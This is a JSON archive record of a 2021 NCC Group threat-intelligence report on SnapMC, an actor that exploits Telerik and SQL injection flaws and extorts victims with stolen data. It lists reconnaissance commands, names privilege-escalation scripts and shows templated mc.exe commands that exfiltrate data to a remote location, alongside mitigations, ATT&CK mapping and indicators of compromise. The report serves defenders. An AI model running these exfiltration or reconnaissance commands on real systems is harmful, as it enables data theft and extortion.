{
    "id": "bf6a53fb-a0bf-4a6e-8a83-c2bd3bf4849a",
    "created_at": "2023-01-12T15:04:47.862616Z",
    "updated_at": "2025-03-27T02:05:43.075306Z",
    "deleted_at": null,
    "sha1_hash": "62b0b5a93a871889e84285bc6ec75b477f72b273",
    "title": "2021-10-11 - SnapMC skips ransomware, steals data",
    "authors": "",
    "file_creation_date": "2022-05-28T16:52:57Z",
    "file_modification_date": "2022-05-28T16:52:57Z",
    "file_size": 126881,
    "plain_text": "# SnapMC skips ransomware, steals data\n\n**[blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)**\n\nOctober 11, 2021\n\nOver the past few months NCC Group has observed an increasing number of data breach extortion\ncases, where the attacker steals data and threatens to publish said data online if the victim decides\nnot to pay. Given the current threat landscape, most notable is the absence of ransomware or any\ntechnical attempt at disrupting the victim’s operations.\n\nWithin the data breach extortion investigations, we have identified a cluster of activities defining a\nrelatively constant modus operandi described in this article. We track this adversary as SnapMC and\nhave not yet been able to link it to any known threat actors. The name SnapMC is derived from the\nactor’s rapid attacks, generally completed in under 30 minutes, and the exfiltration tool mc.exe it\nuses.\n\nExtortion emails threatening their recipients have become a trend over time. The lion’s share of these\nconsists of empty threats sent by perpetrators hoping to profit easily without investing in an actual\nattack. In the extortion emails we have seen from SnapMC have given victims 24 hours to get in\ncontact and 72 hours to negotiate. These deadlines are rarely abided by since we have seen the\nattacker to start increasing the pressure well before countdown hits zero. SnapMC includes a list of\nthe stolen data as evidence that they have had access to the victim’s infrastructure. If the\n\n\n-----\n\norganization does not respond or negotiate within the given timeframe, the actor threatens to (or\nimmediately does) publish the stolen data and informs the victim’s customers and various media\noutlets.\n\n## Modus Operandi\n\n### Initial Access\n\nAt the time of writing NCC Group’s Security Operations Centers (SOCs) have seen SnapMC\nscanning for multiple vulnerabilities in both webserver applications and VPN solutions. We have\nobserved this actor successfully exploiting and stealing data from servers that were vulnerable to:\n\nRemote code execution in Telerik UI for ASPX.NET [1]\nSQL injections\n\nAfter successfully exploiting a webserver application, the actor executes a payload to gain remote\naccess through a reverse shell. Based on the observed payloads and characteristics the actor\nappears to use a publicly available Proof-of-Concept Telerik Exploit [2].\n\nDirectly afterwards PowerShell is started to perform some standard reconnaissance activity:\n\nwhoami\nwhoami /priv\nwmic logicaldisk get caption,description,providername\nnet users /priv\n\n_Note: that in the last command the adversary used the ‘/priv’ option, which is not a valid option for the_\n_net users command._\n\n### Privilege Escalation\n\nIn most of the cases we analyzed the threat actor did not perform privilege escalation. However in\none case we did observe SnapMC trying to escalate privileges by running a handful of PowerShell\nscripts:\n\nInvoke-Nightmare [3]\nInvoke-JuicyPotato [4]\nInvoke-ServiceAbuse [4]\nInvoke-EventVwrBypass [6]\nInvoke-PrivescAudit [7]\n\n### Collection & Exfiltration\n\nWe observed the actor preparing for exfiltration by retrieving various tools to support data collection,\nsuch as 7zip and Invoke-SQLcmd scripts. Those, and artifacts related to the execution or usage of\nthese tools, were stored in the following folders:\n\nC:\\Windows\\Temp\\\nC:\\Windows\\Temp\\Azure\n\n\n-----\n\nC:\\Windows\\Temp\\Vmware\n\nSnapMC used the Invoke-SQLcmd PowerShell script to communicate with the SQL database and\nexport data. The actor stored the exported data locally in CSV files and compressed those files with\nthe 7zip archive utility.\n\nThe actor used the MinIO [8] client to exfiltrate the data. Using the PowerShell commandline, the\nactor configured the exfil location and key to use, which were stored in a config.json file. During the\nexfiltration, MinIO creates a temporary file in the working directory with the file extension\n\n[…].par.minio.\n```\nC:\\Windows\\Temp\\mc.exe --config-dir C:\\Windows\\Temp\\vmware\\.x --insecure alias set <DIR>\n<EXFIL_LOCATION> <API key> <API SECRET> \nC:\\Windows\\Temp\\mc.exe --config-dir C:\\Windows\\Temp\\vmware\\.x --insecure cp --recursive [DIR\nNAME] <CONFIGURED DIRECTORY>/<REMOTE DIRECTORY>/<VICTIM DIRECTORY>\n\n### Mitigations\n\n```\nFirst, initial access was generally achieved through known vulnerabilities, for which patches exist.\nPatching in a timely manner and keeping (internet connected) devices up-to-date is the most effective\nway to prevent falling victim to these types attacks. Make sure to identify where vulnerable software\nresides within your network by (regularly performing) vulnerability scanning.\n\nFurthermore, third parties supplying software packages can make use of the vulnerable software as a\ncomponent as well, leaving the vulnerability outside of your direct reach. Therefore, it is important to\nhave an unambiguous mutual understanding and clearly defined agreements between your\norganization, and the software supplier about patch management and retention policies. The latter\nalso applies to a possible obligation to have your supplier provide you with your systems for forensic\nand root cause analysis in case of an incident.\n\nWorth mentioning, when reference testing the exploitability of specific versions of Telerik it became\nclear that when the software component resided behind a well configured Web Application Firewall\n(WAF), the exploit would be unsuccessful.\n\nFinally, having properly implemented detection and incident response mechanisms and processes\nseriously increases the chance of successfully mitigating severe impact on your organization. Timely\ndetection, and efficient response will reduce the damage even before it materializes.\n\n### Conclusion\n\nNCC Group’s Threat Intelligence team predicts that data breach extortion attacks will increase over\ntime, as it takes less time, and even less technical in-depth knowledge or skill in comparison to a fullblown ransomware attack. In a ransomware attack, the adversary needs to achieve persistence and\nbecome domain administrator before stealing data and deploying ransomware. While in the data\nbreach extortion attacks, most of the activity could even be automated and takes less time while still\nhaving a significant impact. Therefore, making sure you are able to detect such attacks in\ncombination with having an incident response plan ready to execute at short notice, is vital to\nefficiently and effectively mitigate the threat SnapMC poses to your organization.\n\n\n-----\n\n## MITRE ATT&CK mapping\n\n**Tactic** **Technique** **Procedure**\n\n\nReconnaissance T1595.002 –\nVulnerability scanning\n\nInitial Access T1190 – Exploit Public\nFacing Application(s)\n\nPrivilege\nEscalation\n\nExecution T1059.001 –\nPowerShell\n\nCollection T1560.001 – Archive\nvia Utility\n\n\nSnapMC used the Acunetix vulnerability scanner to\nfind systems running vulnerable Telerik software.\n\nSnapMC exploited CVE-2019-18935 and SQL\nInjection.\n\nSnapMC used a combination of PowerShell cmdlets to\nachieve privilege escalation.\n\nSnapMC used a combination of publicly available\nPowerShell cmdlets.\n\nSnapMC used 7zip to prepare data for exfiltration.\n\nSnapMC used MinIO client (mc.exe) to exfiltrate data.\n\n\nExfiltration\n\nMITRE ATT&CK\n\n\nT1567 – Exfiltration\nover Web Service\n\nT1567.002 –\nExfiltration to Cloud\nStorage\n\n\n## Indicators of Compromise\n\n**Type** **Data** **Notes**\n\n\nFile\nlocation\n+ file\nname\n\nFile\nlocation\n+ file\nname\n\n\nC:\\Windows\\Temp[0-9]{10}.[0-9]{1,8}.dll\n\n_(Example: c:\\Windows\\Temp\\1628862598.87034184.dll)_\n\n\nFile name\nof dropped\npayload\nafter\nsuccessful\nTelerik\nexploitation;\nthe first part\nis the\nepoch\ntimestamp\nand last\npart is\nrandomly\ngenerated\n\n\nC:\\Windows\\Temp\\7za.exe 7zip\narchiving\nutility\n\n\n-----\n\n**Type** **Data** **Notes**\n\n\nFile\nname\n\nFile\nname\n\nFile\nname\n\nFile\nname\n\nFile\nlocation\n\nFile\nlocation\n\nFile\nname\n\n\ns.ps1 SQL cmdlet\n\na.ps1 SQL cmdlet\n\nx.ps1 SQL cmdlet\n\n*.par.minio Temporary\nfiles\ncreated by\nMinIO\nduring\nexfiltration\n\nC:\\Windows\\Temp\\Azure\\ Folder for\ntemporary\nfiles\ncreated by\nMinIO\n\nC:\\Windows\\Temp\\Vmware\\ Folder for\ntemporary\nfiles\ncreated by\nMinIO\n\nmc.exe MinIO client\n\n\nHash 651ed548d2e04881d0ff24f789767c0e MD5 hash\nof MinIO\nclient\n\nHash b4171d48df233978f8cf58081b8ad9dc51a6097f SHA1 hash\nof MinIO\nclient\n\nHash 0a1d16e528dc1e41f01eb7c643de0dfb4e5c4a67450c4da78427a8906c70ef3e SHA265\nhash of\nMinIO client\n\nIndicators of Compromise\n\n## References\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-11 - SnapMC skips ransomware, steals data.pdf"
    ],
    "report_names": [
        "2021-10-11 - SnapMC skips ransomware, steals data.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535887,
    "ts_updated_at": 1743041143,
    "ts_creation_date": 1653756777,
    "ts_modification_date": 1653756777,
    "files": {
        "pdf": "https://archive.orkl.eu/62b0b5a93a871889e84285bc6ec75b477f72b273.pdf",
        "text": "https://archive.orkl.eu/62b0b5a93a871889e84285bc6ec75b477f72b273.txt",
        "img": "https://archive.orkl.eu/62b0b5a93a871889e84285bc6ec75b477f72b273.jpg"
    }
}